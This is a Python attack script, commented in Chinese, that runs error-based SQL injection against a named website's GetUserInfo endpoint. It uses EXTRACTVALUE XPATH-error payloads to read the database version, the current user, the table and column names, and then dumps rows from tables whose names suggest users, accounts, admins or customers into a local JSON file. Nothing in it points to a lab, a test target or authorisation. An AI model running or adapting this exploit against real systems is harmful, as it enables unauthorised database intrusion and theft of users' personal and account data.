#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import urllib3
urllib3.disable_warnings()

class SQLiExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.extracted = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_value(self, query, label):
        """提取单个值"""
        print(f"\n[*] 提取: {label}")
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            # 提取XPATH错误中的值
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                value = match.group(1)
                print(f"    [+] {label}: {value}")
                return value
            else:
                # 尝试其他格式
                match = re.search(r"'~([^']+)~'", r.text)
                if match:
                    value = match.group(1)
                    print(f"    [+] {label}: {value}")
                    return value
                else:
                    print(f"    [-] 未找到，响应: {r.text[:500]}")
        except Exception as e:
            print(f"    [-] Error: {e}")
        return None
    
    def extract_tables(self):
        """提取表名"""
        query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
        tables = self.extract_value(query, "表名")
        if tables:
            self.extracted['tables'] = tables.split(',')
            return tables.split(',')
        return []
    
    def extract_columns(self, table_name):
        """提取列名"""
        query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table_name}'"
        columns = self.extract_value(query, f"{table_name}表列名")
        if columns:
            return columns.split(',')
        return []
    
    def extract_user_data(self, table_name, columns):
        """提取用户数据"""
        print(f"\n[*] 提取用户数据: {table_name}")
        
        # 尝试提取前10条记录
        col_list = ','.join(columns[:5])  # 限制列数
        query = f"SELECT GROUP_CONCAT(CONCAT({col_list}) SEPARATOR '|') FROM {table_name} LIMIT 0,10"
        
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                data = match.group(1)
                print(f"    [+] 用户数据: {data[:500]}")
                return data
        except:
            pass
        return None
    
    def run_all(self):
        """执行所有提取"""
        print("[*] 开始数据提取...")
        
        # 提取基础信息
        self.extracted['version'] = self.extract_value("SELECT version()", "数据库版本")
        self.extracted['database'] = self.extract_value("SELECT database()", "数据库名")
        self.extracted['user'] = self.extract_value("SELECT user()", "当前用户")
        
        # 提取表名
        tables = self.extract_tables()
        
        # 查找用户相关表
        user_tables = [t for t in tables if any(kw in t.lower() for kw in ['user', 'account', 'admin', 'customer'])]
        
        if user_tables:
            print(f"\n[!] 发现用户相关表: {user_tables}")
            for table in user_tables[:3]:  # 前3个
                columns = self.extract_columns(table)
                if columns:
                    self.extracted[f'{table}_columns'] = columns
                    # 提取数据
                    data = self.extract_user_data(table, columns)
                    if data:
                        self.extracted[f'{table}_data'] = data
        
        # 保存结果
        with open('sqli_extracted_data.json', 'w', encoding='utf-8') as f:
            json.dump(self.extracted, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 提取完成，数据已保存")

if __name__ == "__main__":
    extract = SQLiExtract()
    extract.run_all()